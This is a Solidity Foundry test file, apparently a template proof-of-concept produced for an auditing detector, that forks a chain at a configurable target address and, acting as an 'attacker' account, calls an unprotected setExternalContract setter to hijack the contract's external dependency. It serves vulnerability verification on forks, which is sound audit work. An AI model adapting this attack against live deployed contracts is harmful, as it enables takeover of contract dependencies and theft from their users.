// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Dangerous External Contract Reference
/// @notice Detector: external-contract-referencing. The target interacts with
///         an external contract that can be swapped or initialized dangerously,
///         allowing for reentrancy or state manipulation.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        
        // Target relies on a setter for an external address
        // TODO: Adapt to the target's address setter
        vm.prank(attackerEOA);
        (bool ok,) = target.call(
            abi.encodeWithSignature("setExternalContract(address)", attackerEOA)
        );
        
        assertTrue(ok, "Could not set external contract address");
        console.log("External dependency successfully hijacked");
    }
}
